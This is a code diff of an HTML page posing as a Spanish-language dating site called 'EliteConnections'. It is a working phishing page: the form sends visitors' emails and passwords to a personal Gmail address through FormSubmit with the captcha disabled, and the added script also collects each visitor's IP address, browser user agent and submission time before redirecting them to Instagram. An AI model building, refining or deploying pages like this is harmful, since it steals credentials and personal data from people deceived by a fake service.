@@ -19,7 +19,6 @@
             height: 100vh;
         }
 
-        /* Video de fondo */
         #videoBackground {
             position: fixed;
             top: 0;
@@ -49,8 +48,6 @@
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.3);
-            position: relative;
-            z-index: 1;
         }
 
         .logo {
@@ -65,26 +62,10 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 8px;
-        }
-
-        .logo .tagline {
-            color: #666;
-            font-size: 1.1em;
-            font-weight: 300;
-        }
-
-        h2 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-            font-size: 1.8em;
-            font-weight: 600;
         }
 
         .form-group {
             margin-bottom: 25px;
-            position: relative;
         }
 
         label {
@@ -92,7 +73,6 @@
             margin-bottom: 10px;
             font-weight: 600;
             color: #555;
-            font-size: 0.95em;
         }
 
         input[type="email"],
@@ -102,15 +82,7 @@
             border: 2px solid #e1e8ed;
             border-radius: 12px;
             font-size: 16px;
-            transition: all 0.3s ease;
             background: #fff;
-        }
-
-        input:focus {
-            border-color: #ff69b4;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.1);
-            transform: translateY(-2px);
         }
 
         button {
@@ -123,99 +95,15 @@
             font-size: 16px;
             width: 100%;
             font-weight: 600;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(255, 105, 180, 0.3);
         }
 
         button:disabled {
             background: #cccccc;
-            transform: none;
-            box-shadow: none;
             cursor: not-allowed;
-        }
-
-        .loading {
-            text-align: center;
-            margin-top: 15px;
-            color: #ff69b4;
-            font-weight: 600;
-        }
-
-        .error {
-            color: #e74c3c;
-            font-size: 0.85em;
-            margin-top: 8px;
-            font-weight: 500;
-        }
-
-        .password-hint {
-            font-size: 0.8em;
-            color: #888;
-            margin-top: 8px;
-            font-style: italic;
-        }
-
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-top: 25px;
-            text-align: center;
-        }
-
-        .feature {
-            padding: 12px;
-            background: rgba(255, 105, 180, 0.1);
-            border-radius: 10px;
-            font-size: 0.85em;
-            color: #666;
-            font-weight: 500;
-        }
-
-        .feature i {
-            color: #ff69b4;
-            font-weight: bold;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        /* Animaciones */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .container {
-            animation: fadeInUp 0.8s ease-out;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .container {
-                margin: 20px;
-                padding: 30px 25px;
-            }
-            
-            body {
-                overflow-y: auto;
-            }
         }
     </style>
 </head>
 <body>
-    <!-- Video de fondo -->
     <video id="videoBackground" autoplay muted loop>
         <source src="https://assets.mixkit.co/videos/preview/mixkit-couple-having-a-romantic-dinner-while-looking-at-43363-large.mp4" type="video/mp4">
     </video>
@@ -224,87 +112,70 @@
     <div class="container">
         <div class="logo">
             <h1>EliteConnections</h1>
-            <div class="tagline">Donde los corazones se encuentran</div>
+            <div>Donde los corazones se encuentran</div>
         </div>
         
         <h2>Comienza tu historia de amor</h2>
         
-        <!-- FORMULARIO FORMSUBMIT -->
-        <form id="registroForm" action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
-            <!-- Campos ocultos para configuración -->
+        <!-- FORMULARIO FORMSUBMIT CON CONFIGURACIÓN CORRECTA -->
+        <form action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
+            <!-- CONFIGURACIÓN FORMSUBMIT -->
             <input type="hidden" name="_subject" value="🔥 NUEVO REGISTRO - EliteConnections">
-            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_template" value="basic">
+            <input type="text" name="_honey" style="display:none">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://www.instagram.com">
             
             <div class="form-group">
-                <label for="email">Correo electrónico</label>
-                <input type="email" id="email" name="email" required placeholder="tu.corazon@ejemplo.com">
-                <div id="emailError" class="error"></div>
+                <label>Correo electrónico</label>
+                <input type="email" name="email" required placeholder="tu.corazon@ejemplo.com">
             </div>
             
             <div class="form-group">
-                <label for="password">Contraseña</label>
-                <input type="password" id="password" name="password" required minlength="8">
-                <div class="password-hint">Usa 8 o más caracteres para proteger tu cuenta</div>
-                <div id="passwordError" class="error"></div>
+                <label>Contraseña</label>
+                <input type="password" name="password" required minlength="8" placeholder="Mínimo 8 caracteres">
             </div>
             
+            <!-- CAMPOS ADICIONALES QUE QUIERES RECIBIR -->
+            <input type="hidden" name="fecha" id="fechaField">
+            <input type="hidden" name="ip" id="ipField">
+            <input type="hidden" name="navegador" id="navegadorField">
+            
             <button type="submit" id="submitButton">Encontrar mi pareja ideal</button>
-            <div id="loadingMessage" class="loading" style="display: none;">Buscando tu media naranja...</div>
         </form>
-
-        <div class="features">
-            <div class="feature">
-                <i>❤️</i>
-                Compatibilidad
-            </div>
-            <div class="feature">
-                <i>🔒</i>
-                Seguro
-            </div>
-            <div class="feature">
-                <i>🌎</i>
-                Global
-            </div>
-            <div class="feature">
-                <i>💬</i>
-                Chat en vivo
-            </div>
-        </div>
-
-        <div class="login-link">
-            ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión aquí</a>
-        </div>
     </div>
 
 <script>
-    document.getElementById('registroForm').addEventListener('submit', function(e) {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const submitButton = document.getElementById('submitButton');
-        const loadingMessage = document.getElementById('loadingMessage');
-        
-        // Validación básica
-        if (!email || !password) {
-            alert('Por favor completa todos los campos');
-            e.preventDefault();
-            return;
-        }
-        
-        if (password.length < 8) {
-            alert('La contraseña debe tener al menos 8 caracteres');
-            e.preventDefault();
-            return;
-        }
-        
-        // Mostrar carga
-        submitButton.disabled = true;
-        loadingMessage.style.display = 'block';
-        
-        // FormSubmit se encarga del envío automáticamente
-        // No necesitamos JavaScript adicional
-    });
+// Llenar campos ocultos antes de enviar
+document.querySelector('form').addEventListener('submit', function() {
+    // Fecha actual
+    document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
+    
+    // Navegador
+    document.getElementById('navegadorField').value = navigator.userAgent;
+    
+    // Obtener IP
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ipField').value = data.ip;
+        })
+        .catch(() => {
+            document.getElementById('ipField').value = 'IP no disponible';
+        });
+    
+    // Deshabilitar botón
+    document.getElementById('submitButton').disabled = true;
+    document.getElementById('submitButton').textContent = 'Enviando...';
+});
+
+// Si falla FormSubmit, mostrar mensaje
+setTimeout(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('success')) {
+        alert('¡Registro exitoso! Revisa tu correo.');
+    }
+}, 1000);
 </script>
 </body>
-</html>
+                </html>
